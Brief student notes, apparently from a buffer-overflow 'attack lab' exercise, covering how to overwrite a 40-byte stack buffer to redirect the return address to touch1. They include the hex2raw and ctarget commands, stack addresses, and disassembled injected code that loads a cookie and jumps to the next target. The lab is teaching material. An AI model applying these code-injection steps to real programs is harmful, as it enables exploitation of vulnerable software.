objdump to obtain dissambled version of ctarget.
To generate assembly code from the executable, execute `objdump -d ctarget > ctarget.s`.

gdb to step the execution through the last few steps.

touch1 address 4017c0
Modify buf through careful input to change the value of ret address to touch1.
buffer size 0x28, 40 bytes.
`./hex2raw < probehex.txt > proberaw`
`./ctarget -q < probraw`


0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret 

buffer head: rsp = 0x000000005561dc78
Let getbuf return to the beginning of the buf. Execute the code here.
Place the string at the beginning of the stack of the function test.
rsp = 0x5561dca8